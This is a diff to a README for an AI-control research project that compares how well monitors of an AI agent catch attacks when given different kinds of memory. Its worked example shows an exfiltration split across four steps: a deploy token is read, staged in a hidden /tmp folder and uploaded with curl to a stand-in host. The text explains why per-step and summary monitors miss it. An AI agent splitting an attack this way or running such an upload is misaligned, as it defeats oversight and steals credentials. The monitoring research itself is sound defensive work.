@@ -34,15 +34,82 @@ benign steps get flagged, and an attack counts as caught if any step crosses tha
 threshold before the attack completes.
 
 The experiment is a comparison. The same trajectories are scored five ways, differing
-only in what the monitor is allowed to remember:
+only in what the monitor is allowed to remember.
 
-| condition | what the monitor remembers |
-|---|---|
-| `per_step` | nothing — each action judged alone |
-| `scalar_posterior` | one running number, a Beta credence over the agent |
-| `running_summary` | a compressed carry-forward summary, rewritten each step |
-| `full_context` | every earlier summary, in the prompt |
-| `advisory` / `cascade` | a ledger it can search and read specific records from |
+## The five memory conditions
+
+They are a ladder, from no memory to structured memory. Everything else is held fixed —
+same trajectories, same models, same threshold calibration.
+
+Take one decomposed attack inside a 150-step trajectory:
+
+```
+step 10   cat /var/lib/svc/deploy.token
+step 45   mkdir -p /tmp/.build-cache
+step 60   cp /var/lib/svc/deploy.token /tmp/.build-cache/t
+step 90   curl -T /tmp/.build-cache/t https://updates.example.net/u
+```
+
+Each is something a sysadmin does. Only together are they an exfiltration. Here is what
+each condition has when it reaches step 90.
+
+**1. `per_step` — no memory.** Sees `curl -T /tmp/.build-cache/t https://...` and nothing
+else. It is uploading a file; people upload files. Scores low.
+
+> The floor, and the current standard — LinuxArena's own protocol. Everything else has to
+> beat it.
+
+**2. `scalar_posterior` — one number.** A running Beta credence over the agent, updated by
+each per-step score. At step 90 it holds *"this agent has been slightly-above-baseline
+suspicious for a while."*
+
+> Wen et al.'s cross-episode credence, and the closest prior art. It catches an attacker
+> who is *consistently* a bit off, but a scalar cannot represent *which* earlier actions
+> relate to this one — it has no way to say "the file being uploaded is the token read at
+> step 10." That is the whole argument, so **this is the baseline that decides whether the
+> project is justified.**
+
+**3. `running_summary` — compressed text carried forward.** At each step the monitor
+rewrites a short summary of everything so far and judges the next step against it. By
+step 90 that summary has been rewritten 89 times.
+
+> The TRACE-style sequential monitor, and its failure is the interesting one: at step 11
+> nobody knew the token read mattered, so it was compressed away. **Compression happens
+> before you know what matters.** TRACE measured this — recall .580 against .844 for
+> structured evidence.
+
+**4. `full_context` — everything in the prompt.** Every summary line for steps 0–89,
+dumped in, no retrieval.
+
+> Two jobs. It answers "why not just use a bigger context window?", and it isolates
+> fetch-by-id: if the ledger only ties it, retrieval is doing nothing and the index alone
+> carries the result. It is also where dilution shows up — four relevant lines among
+> ninety.
+
+**5. `ledger` — structured and searchable.** Sees a one-line index of steps 0–89, picks up
+to four ids to read in full, gets those exact records, and may revise earlier scores in
+light of them.
+
+> At step 90 it can search for `/tmp/.build-cache`, land on steps 45 and 60, follow those
+> to the token at step 10, and see the conjunction. It can also mark step 10 as
+> retroactively suspicious — which forward-only propagation structurally cannot do,
+> because by then the summary has discarded the justification.
+
+The ledger runs as **two arms over a byte-identical ledger**. The only difference is who
+decides:
+
+| arm | 7B does | 14B does |
+|---|---|---|
+| `advisory` | **decides**, using evidence handed to it | retrieves and supplies evidence |
+| `cascade` | supplies a cheap score as a feature | **decides** |
+
+> Memory isn't one thing. A scalar catches an attacker who is *consistently* suspicious;
+> only structure catches a *conjunction*.
+
+That is why the ladder is the experiment rather than a list of baselines — and why
+`scalar_posterior` is the rung that matters most. If one running number captures most of
+the gain, everything above it is unjustified complexity, and that is a finding worth
+publishing on its own.
 
 ## What happens in a single step
 
@@ -184,23 +251,17 @@ scripts/
 tests/               pure-component unit tests
 ```
 
-## Protocols
+## Running the conditions
 
-Default sweep:
+Each is a `--protocols` name. `per_step,running_summary,advisory,cascade` is the default
+sweep; the other two are opt-in, since `full_context` loads the 32B and needs the card to
+itself.
 
-| name | memory | decides |
-|---|---|---|
-| `per_step` | none | 7B |
-| `running_summary` | compressed carry-forward | 7B |
-| `advisory` (arm A) | ledger | 7B, with evidence from the 14B |
-| `cascade` (arm B) | ledger | 14B, with a 7B feature |
-
-Built but off by default — pass them to `--protocols` to enable:
-
-| name | memory | decides |
-|---|---|---|
-| `scalar_posterior` | one Beta posterior | 7B |
-| `full_context` | whole causal index in prompt, no fetch | 32B |
+| `--protocols` name | models loaded |
+|---|---|
+| `per_step` · `scalar_posterior` · `running_summary` | 7B |
+| `advisory` · `cascade` | 7B + 14B |
+| `full_context` | 32B, alone |
 
 The 32B is deliberately the **baseline to beat**, not part of the system: if the global
 monitor were itself a 32B, "memory helped" would be confounded with "the bigger model
